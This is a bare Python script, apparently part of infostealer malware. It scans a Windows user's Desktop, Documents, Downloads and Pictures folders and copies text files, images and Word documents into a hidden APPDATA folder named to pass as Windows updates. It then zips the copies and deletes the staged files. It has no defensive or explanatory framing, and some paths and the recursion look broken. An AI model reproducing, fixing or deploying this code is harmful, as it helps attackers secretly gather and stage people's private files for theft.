from shutil import copy
from shutil import make_archive
import os
target_path_txt = rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt"
target_path_images = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images"
target_path_docx = f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\docx"

txt = []
images = []
docx = []

def main():
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
    downloads = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads')
    pictures = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')

    get_files(desktop)
    get_files(documents)
    get_files(downloads)
    get_files(pictures)


def get_files(path):
    global txt, images, docx
    txt = []
    images = []
    docx = []

    for root, dirs, files in os.walk(path):
        if files:
            if root == target_path_txt or root == target_path_images or root == target_path_docx:
                continue
            for file in files:
                if file.endswith(".txt"):
                    txt.append(os.path.join(root, file))
                elif file.endswith(".png") or file.endswith(".jpg") or file.endswith(".jpeg"):
                    images.append(os.path.join(root, file))
                elif file.endswith(".docx"):
                    docx.append(os.path.join(root, file))
            for dir in dirs:
                get_files(dir)
        
        for file in txt:
            copy(file, target_path_txt)
        for file in images:
            copy(file, target_path_images)
        for file in docx:
            copy(file, target_path_docx)

def remove_remnants(path):
    for root, dirs, files in os.walk(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files"):
        for file in files:
            os.remove(os.path.join(root, file))

main()
make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\txt")
make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\images")
make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\docx", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\docx")

remove_remnants(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
